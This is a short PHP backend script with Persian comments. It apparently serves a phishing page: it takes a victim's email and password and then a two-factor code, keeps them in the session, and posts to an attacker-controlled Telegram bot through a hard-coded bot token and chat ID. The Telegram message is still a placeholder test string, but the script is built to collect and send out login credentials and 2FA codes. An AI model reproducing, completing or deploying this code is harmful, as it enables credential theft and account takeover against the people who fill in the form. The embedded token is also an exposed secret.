<?php
session_start();


// استفاده از تابع

// پردازش فرم‌ها
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['email']) && isset($_POST['password'])) {
        // مرحله اول: دریافت ایمیل و پسورد
        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
        $password = $_POST['password'];

        // ذخیره‌سازی در متغیر سراسری
        $_SESSION['email'] = $email;
        $_SESSION['password'] = $password;

        // پیام موفقیت به AJAX
        echo json_encode(["status" => "success"]);
        exit;
    }

    if (isset($_POST['factor'])) {
        // مرحله دوم: دریافت فاکتور
        $factor = $_POST['factor'];
        $email = $_SESSION['email'];
        $password = $_SESSION['password'];

        // ارسال اطلاعات به ربات تلگرام (این قسمت را با توکن و شناسه چت خود پر کنید)
        $token = "7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY";
        $chatId = "-4614449543";
        $message = "پیام تستی";

        // ارسال پاسخ به کاربر
        $send_url = "https://api.telegram.org/bot$token/sendMessage";
        $send_params = [
            'chat_id' => $chatId,
            'text' => $message,
        ];

        $ch = curl_init($send_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send_params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        // موفقیت در پردازش
        echo json_encode(["status" => "sent"]);
    }
}
